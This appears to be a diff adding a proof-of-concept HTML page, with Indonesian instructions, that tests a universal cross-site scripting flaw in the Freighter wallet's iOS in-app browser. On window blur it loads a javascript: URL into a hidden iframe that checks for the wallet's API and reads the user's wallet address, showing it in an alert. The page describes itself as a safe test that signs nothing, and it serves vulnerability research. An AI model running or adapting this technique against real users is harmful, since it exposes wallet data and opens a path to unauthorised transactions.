@@ -1,1 +1,19 @@
-<button onclick="window.open('data:text/html;base64,PHNjcmlwdD5hbGVydChsb2NhdGlvbi5ocmVmKTwvc2NyaXB0Pg==')">open data</button>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>UXSS PoC: Freighter iOS - 0x403for</title>
+  <style>iframe{display:none;} body{background:#0a0a0a;color:#fff;font-family:monospace;text-align:center;padding-top:100px}</style>
+  <script>
+    window.onblur = function(){
+      // SAFE PoC - cuma buktiin freighterApi ke-expose, TIDAK sign transaksi
+      document.getElementById("iframe").src = "javascript:(async()=>{try{const hasApi=typeof window.freighterApi!=='undefined'; const addr=hasApi?await window.freighterApi.getAddress().then(r=>r.address).catch(e=>e.message):'no-api'; alert('UXSS Freighter by 0x403for\\nfreighterApi exists:'+hasApi+'\\naddress:'+addr+'\\nurl:'+location.href);}catch(e){alert('error:'+e)}})();";
+    };
+  </script>
+</head>
+<body>
+  <h1>Freighter UXSS Test - 0x403for</h1>
+  <p>1. Buka di Freighter dApp browser<br>2. Tap di sini, terus switch app / buka tab lain<br>3. Balik lagi ke Freighter</p>
+  <p style="opacity:0.5;font-size:12px">Jika muncul alert dengan freighterApi:true + address kamu = VULN UXSS<br>Jika src blocked / false false = SECURE</p>
+  <iframe id="iframe" src=""></iframe>
+</body>
+</html>
